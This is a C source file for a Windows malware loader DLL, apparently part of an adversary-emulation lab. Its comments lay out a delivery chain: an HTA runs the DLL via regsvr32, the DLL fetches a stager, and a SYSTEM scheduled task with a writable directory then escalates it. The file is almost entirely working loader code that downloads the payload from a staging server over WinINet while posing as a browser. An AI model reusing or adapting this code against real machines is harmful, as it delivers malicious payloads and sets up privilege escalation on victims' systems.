// c0015_loader.c — first stage of the delivery chain, running as the victim user.
//
// The HTA downloads this DLL and runs it with regsvr32. It cannot create a service: the lab keeps
// the victim account as a standard user, so it does what a user-level loader can do and hands the
// privileged half to the environment:
//
//   1. fetch the stager from the staging server
//   2. overwrite the binary that a scheduled task already runs as SYSTEM
//   3. exit; the next task start gives the stager the system token
//
// The task and its writable directory are a deliberate lab weakness, documented in gap/README.md.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define STAGER_URL  "http://192.168.50.100/updater.exe"
#define STAGER_DIR  "C:\\ProgramData\\C0015"
#define STAGER_PATH "C:\\ProgramData\\C0015\\updater.exe"
#define LOG_PATH    "C:\\ProgramData\\C0015\\loader.log"

static void Log(const char *fmt, ...)
{
    FILE *f;
    va_list ap;
    f = fopen(LOG_PATH, "a");
    if (!f) return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static BOOL Download(const char *url, const char *path)
{
    HINTERNET net, req;
    HANDLE out;
    BYTE buf[16384];
    DWORD got, written;
    BOOL ok = TRUE;

    net = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!net) return FALSE;
    req = InternetOpenUrlA(net, url, NULL, 0,
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!req) { InternetCloseHandle(net); return FALSE; }

    out = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) { InternetCloseHandle(req); InternetCloseHandle(net); return FALSE; }

    for (;;) {
        if (!InternetReadFile(req, buf, sizeof(buf), &got)) { ok = FALSE; break; }
        if (got == 0) break;
        if (!WriteFile(out, buf, got, &written, NULL) || written != got) { ok = FALSE; break; }
    }
    CloseHandle(out);
    InternetCloseHandle(req);
    InternetCloseHandle(net);
    Log("download %s -> %s : %s", url, path, ok ? "ok" : "failed");
    return ok;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
{
    (void)h; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) Log("loader attached");
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    Log("=== loader start ===");
    Download(STAGER_URL, STAGER_PATH);
    Log("=== loader done ===");
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void)
{
    return S_OK;
}
